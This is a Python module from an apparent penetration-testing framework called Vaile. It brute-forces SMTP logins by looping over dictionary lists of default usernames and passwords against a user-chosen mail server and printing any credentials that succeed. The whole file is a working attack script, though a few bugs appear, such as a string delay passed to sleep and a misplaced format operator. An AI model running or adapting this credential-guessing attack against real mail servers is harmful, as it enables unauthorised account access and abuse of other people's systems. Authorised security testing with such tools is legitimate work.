#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    Vaile Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires Vaile Framework
#https://github.com/VainlyStrain/Vaile


import os
import sys
import time
import socket
from time import sleep
import smtplib
from core.Core.colors import *

smtpuser = []
smtppass = []

searchinfo = "SMTP cracker"
info = "Crack common SMTP login credentials using dictionaries."
properties = {}

def smtpBrute0x00(ip, usernames, passwords, port, delay):

    s = smtplib.SMTP(str(ip), port)
    for username in usernames:
        for password in passwords:
            try:
                s.ehlo()
                s.starttls()
                s.ehlo
                s.login(str(username), str(password))
                print(G + ' [+] Username: %s | Password found: %s\n' % (username, password))
                s.close()
            except smtplib.SMTPAuthenticationError:
                print(GR+ " [*] Checking : "+C+"Username: %s | "+B+"Password: %s "+R+"| Incorrect!\n" % (username, password))
                sleep(delay)
            except Exception as e:
                print(R+" [-] Error caught! Exception: "+str(e))
                pass
            except KeyboardInterrupt:
                s.close()
                sys.exit(1)

def smtpbrute(web):

    print(GR+' [*] Loading module...\n')
    time.sleep(0.6)
    print(R+'    =====================')
    print(R+'     S M T P   B R U T E ')
    print(R+'    =====================\n')
    try:
        with open('files/brute-db/smtp/smtp_defuser.lst') as users:
            for user in users:
                user = user.strip('\n')
                smtpuser.append(user)
        with open('files/brute-db/smtp/smtp_defpass.lst') as passwd:
            for passw in passwd:
                passw = passw.strip('\n')
                smtppass.append(passw)
    except IOError:
        print(R+' [-] File paths not found!')

    web = web.replace('https://','')
    web = web.replace('http://','')
    ip = socket.gethostbyname(web)
    w = input(O+' [#] Use IP '+R+ip+' ? (y/n) :> ')
    if w == 'y' or w == 'Y':
        port = input(O+' [#] Enter the port (eg. 25, 587) :> ')
        delay = input(C+' [#] Delay between each request (eg. 0.2) :> ')
        print(B+' [*] Initiating module...')
        time.sleep(1)
        print(GR+' [*] Trying using default credentials...')
        smtpBrute0x00(ip, smtpuser, smtppass, port, delay)
    elif w == 'n' or w == 'N':
        ip = input(O+' [#] Enter IP :> ')
        port = input(O+' [#] Enter the port (eg. 25, 587) :> ')
        delay = input(C+' [#] Delay between each request (eg. 0.2) :> ')
        print(B+' [*] Initiating module...')
        time.sleep(1)
        print(GR+' [*] Trying using default credentials...')
        smtpBrute0x00(ip, smtpuser, smtppass, port, delay)
    else:
        print(R+' [-] Sorry fam you typed shit!')
        sleep(0.7)
    print(G+' [+] Done!')

def attack(web):
    smtpbrute(web)